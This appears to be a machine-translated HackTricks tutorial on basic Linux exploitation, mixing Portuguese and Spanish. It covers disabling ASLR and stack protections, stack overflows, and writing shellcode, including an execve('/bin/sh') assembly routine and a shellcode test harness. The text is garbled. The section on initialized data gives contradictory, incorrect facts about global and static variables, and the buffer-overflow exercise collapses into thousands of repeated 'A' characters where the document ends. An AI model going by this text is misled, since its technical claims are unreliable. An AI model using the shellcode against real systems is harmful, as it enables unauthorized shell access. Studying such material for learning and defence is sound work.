# Linux Exploiting (B√°sico) (SPA)

## Linux Exploiting (B√°sico) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatoriza√ß√£o de Endere√ßos

**Desativar aleatoriza√ß√£o (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reativar aleatoriza√ß√£o GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desativar para uma execu√ß√£o** (n√£o requer root):\
setarch \`arch\` -R ./exemplo argumentos\
setarch \`uname -m\` -R ./exemplo argumentos

**Desativar prote√ß√£o de execu√ß√£o na pilha**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemplo.c -o exemplo

**Arquivo core**\
ulimit -c unlimited\
gdb /exec arquivo\_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texto**\
**Dados**\
**BSS**\
**Heap**

**Pilha**

**Se√ß√£o BSS**: Vari√°veis globais ou est√°ticas n√£o inicializadas
```
static int i;
```
**Se√ß√£o DATA**: Vari√°veis globais ou est√°ticas inicializadas

Nesta se√ß√£o, discutiremos sobre as vari√°veis globais ou est√°ticas inicializadas. Essas vari√°veis s√£o armazenadas na se√ß√£o de dados do programa e s√£o inicializadas com valores espec√≠ficos.

As vari√°veis globais s√£o declaradas fora de qualquer fun√ß√£o e podem ser acessadas por todas as fun√ß√µes do programa. Elas s√£o inicializadas automaticamente com valores padr√£o, como zero para vari√°veis num√©ricas e NULL para ponteiros.

As vari√°veis est√°ticas tamb√©m s√£o declaradas fora de qualquer fun√ß√£o, mas t√™m um escopo limitado √† fun√ß√£o em que s√£o definidas. Elas mant√™m seu valor entre chamadas de fun√ß√£o e s√£o inicializadas apenas uma vez, na primeira chamada da fun√ß√£o.

A explora√ß√£o de vari√°veis globais ou est√°ticas inicializadas pode ser √∫til em certos cen√°rios de hacking, como a obten√ß√£o de informa√ß√µes sens√≠veis armazenadas nessas vari√°veis ou a modifica√ß√£o de seu valor para obter um comportamento indesejado do programa.

No entanto, √© importante ressaltar que a explora√ß√£o de vari√°veis globais ou est√°ticas inicializadas √© uma atividade ilegal e anti√©tica, e deve ser realizada apenas em um ambiente controlado e com permiss√£o adequada.
```
int i = 5;
```
## **1. DESBORDAMIENTO DE PILA**

> desbordamiento de b√∫fer, desbordamiento de pila, desbordamiento de pila, aplastamiento de pila

Violaci√≥n de segmento: cuando se intenta acceder a una direcci√≥n de memoria que no ha sido asignada al proceso.

Para obtener la direcci√≥n de una funci√≥n dentro de un programa, se puede hacer lo siguiente:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chamada para sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrup√ß√µes do kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel composto pelo c√≥digo assembly e podemos obter os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e obter os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas do sistema est√£o sendo feitas corretamente, compile o programa anterior e as chamadas do sistema devem aparecer em **strace ./PROGRAMA_COMPILADO**

Ao criar shellcodes, voc√™ pode usar um truque. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que possamos apontar para a string com esse EIP e continuar executando o c√≥digo.

EX **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Usando o Stack (/bin/sh):**

O objetivo deste exerc√≠cio √© explorar uma vulnerabilidade de estouro de buffer em um programa para obter acesso ao shell (/bin/sh) do sistema.

1. Compilando o c√≥digo de exemplo:
   ```
   $ gcc -o vuln vuln.c
   ```

2. Execute o programa compilado:
   ```
   $ ./vuln
   ```

3. Observe que o programa solicita uma entrada do usu√°rio. Digite qualquer coisa para continuar.

4. Agora, vamos explorar a vulnerabilidade de estouro de buffer. Digite uma entrada que seja maior do que o tamanho do buffer alocado pelo programa. Por exemplo:
   ```
   $ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA